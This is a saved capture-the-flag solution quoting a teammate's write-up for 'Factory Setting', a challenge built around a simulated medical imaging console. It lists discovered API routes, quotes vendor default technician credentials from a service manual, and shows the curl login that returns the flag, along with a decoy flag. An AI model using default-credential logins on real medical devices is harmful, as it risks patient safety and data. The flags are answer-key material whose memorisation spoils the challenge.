# Factory Setting — saved solution

Flag / submission candidate: `deadface{d3fault_cr3ds_n3v3r_ch4ng3d}`

Our original PCGCTF snapshot already marks this challenge solved. Imported Garcia writeup; not independently reproduced during this import. Challenge already solved in our saved scoreboard snapshot.

Source: **Antonio B. Garcia Jr.**, 2026-10-28, [Day 1 writeup](../../../../team/garcia-day1/source.md). The challenge’s name, points and solved snapshot remain those of our original inventory.

## Teammate’s writeup (quoted)

> ## Factory Setting (200) — Medical Device / IoT
>
> **Flag:** `deadface{d3fault_cr3ds_n3v3r_ch4ng3d}`
>
> **Target:** `http://emedra.dctf.io:8080/` (Emedra CerebraScan CS-9000, ScanWorks Operator Console)
> **File:** `cs9000-field-service-manual.pdf`
>
> #### Challenge
>
> The ScanWorks login wants real technician credentials. Hospitals never change the defaults the vendor ships with. Find the credentials to log into the ScanWorks login.
>
> #### Solution
>
> Solved live against the device. The console is a Three.js scene backed by a JSON API. Enumerating the client bundle (`/assets/index-*.js`) reveals the kiosk routes:
>
> ```
> /api/kiosk/login   (GET  — login HTML)
> /api/kiosk/auth    (POST — {username, password})
> ```
>
> **Decoy (for this challenge):** `GET /api/kiosk/login` returns an HTML comment holding `deadface{v13w_s0urc3_sav3s_l1v3s}` ("temporary QA technician PIN"). That is a view-source trap, not the Factory Setting flag — it is the answer to *Bedside Manner* instead.
>
> The real default credentials are in the field service manual (linked off the **Asset Label** hotspot, `/assets/cs9000-field-service-manual.pdf`). Section 2.3, *Default technician account*:
>
> ```
> Username: emedra-svc
> Password: ChangeMe!2019
> ```
>
> Authenticate with them:
>
> ```bash
> curl -s http://emedra.dctf.io:8080/api/kiosk/auth \
>   -H 'content-type: application/json' \
>   -d '{"username":"emedra-svc","password":"ChangeMe!2019"}'
> ```
>
> ```json
> {"ok":true,"token":"...","tech":{"name":"Service Technician"},
>  "maintenanceToken":"deadface{d3fault_cr3ds_n3v3r_ch4ng3d}"}
> ```
>
> The `maintenanceToken` in the auth response is the flag: `deadface{d3fault_cr3ds_n3v3r_ch4ng3d}`.
>
> Extracting the PDF text locally (`pdftotext`) is the quick way to read the compressed manual stream. The returned `token` (a UUID) is the session token used to drive the other kiosk routes (`/api/kiosk/patients`, `/api/kiosk/scan`, `/api/shell`, `/api/external-display`), which feed the related device challenges (*Live Boot*, *Second Opinion*).
>
> ---
